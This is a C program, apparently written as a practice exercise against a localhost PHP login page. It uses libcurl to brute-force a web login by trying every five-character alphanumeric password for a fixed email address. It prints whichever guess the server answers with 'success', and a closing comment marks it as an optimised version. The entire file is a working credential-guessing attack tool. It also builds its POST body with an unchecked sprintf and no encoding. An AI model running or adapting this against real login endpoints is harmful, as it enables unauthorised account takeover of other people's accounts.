#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <time.h>

struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realSize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realSize + 1); // +1 for null terminator
    if (ptr == NULL) {
        fprintf(stderr, "not enough memory (realloc returned NULL)\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realSize);
    mem->size += realSize;
    mem->memory[mem->size] = '\0'; // Null-terminate the buffer
    return realSize;
}

CURL *curl_init_session() {
    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, ""); // Enable cookie handling
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); // Follow HTTP redirects
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    }
    return curl;
}

int attempt_login(CURL *curl, const char *url, const char *email, char *password) {
    struct MemoryStruct chunk;
    chunk.memory = malloc(1); // initially allocate 1 byte
    chunk.size = 0;

    char postfields[256];
    sprintf(postfields, "signIn=true&email=%s&password=%s", email, password);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    CURLcode res = curl_easy_perform(curl);

    int success = 0;
    if(res == CURLE_OK) {
        if(strstr(chunk.memory, "success")) {
            printf("Password found: %s\n", password);
            success = 1;
        } else {
            printf("Login failed for password: %s. Server response was: %s\n", password, chunk.memory);
        }
    } else {
        fprintf(stderr, "CURL request failed for password '%s': %s\n", password, curl_easy_strerror(res));
    }

    free(chunk.memory);
    return success;
}

void generate_passwords(CURL *curl, const char *url, const char *email) {
    clock_t start, end;
    double cpu_time_used;
    start = clock();

    char password[6] = {0}; // Initialize all elements to null
    char chars[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int num_chars = strlen(chars); // Only compute once

    for (int idx0 = 0; idx0 < num_chars; ++idx0) {
        password[0] = chars[idx0];
        for (int idx1 = 0; idx1 < num_chars; ++idx1) {
            password[1] = chars[idx1];
            for (int idx2 = 0; idx2 < num_chars; ++idx2) {
                password[2] = chars[idx2];
                for (int idx3 = 0; idx3 < num_chars; ++idx3) {
                    password[3] = chars[idx3];
                    for (int idx4 = 0; idx4 < num_chars; ++idx4) {
                        password[4] = chars[idx4];
                        password[5] = '\0'; // Ensure the string is null-terminated
                        if (attempt_login(curl, url, email, password)) {
                            end = clock();
                            cpu_time_used = ((double) (end - start)) / CLOCKS_PER_SEC;
                            printf("Time taken: %f seconds\n", cpu_time_used);
                            return;
                        }
                    }
                }
            }
        }
    }
}

int main(void) {
    const char *email = "a@gmail.com"; // The email to test
    const char *url = "http://localhost/login/register.php"; // URL to the PHP script for login

    CURL *curl = curl_init_session();
    if (curl) {
        generate_passwords(curl, url, email);
        curl_easy_cleanup(curl);
    } else {
        fprintf(stderr, "CURL initialization failed\n");
    }
    curl_global_cleanup();
    return 0;
}
//more optimized
